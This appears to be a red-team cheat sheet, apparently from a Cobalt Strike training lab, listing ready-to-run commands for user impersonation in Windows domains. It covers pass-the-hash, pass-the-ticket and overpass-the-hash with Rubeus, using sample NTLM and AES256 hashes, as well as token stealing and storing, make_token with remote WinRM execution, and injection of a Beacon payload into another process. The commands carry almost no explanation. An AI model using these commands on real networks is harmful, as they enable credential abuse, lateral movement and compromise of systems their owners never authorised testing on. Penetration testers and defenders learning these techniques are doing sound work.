# User Impersonation

**Pass The Hash**

drop impersonation with rev2self

```
getuid
pth DOMAIN\User 59fc0f884922b4ce376051134c71e22c
rev2self
```

**Pass The Ticket**

Create this then steal the token

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
steal_token <PID>
```

**Overpass the hash**

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

**Token Impersonation**

```
steal_token <PID>
```

**Token Store**

Stealing tokens for future use
```
token-store steal <PID>
token-store show
token-store use <id>
token-store remove <id>
token-store remove-all
```


**Make Token**

The make_token command allows you to impersonate a user if you know their plaintext password. The logon session created with LogonUserA has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource.

```
make_token DOMAIN\User <pass>
remote-exec winrm web.dev.cyberbotic.io whoami
```

**Process Injection**

shinject allows you to inject any arbitrary shellcode from a binary file on your attacking machine; and inject will inject a full Beacon payload for the specified listener.
```
inject <PID> x64 tcp-local
```
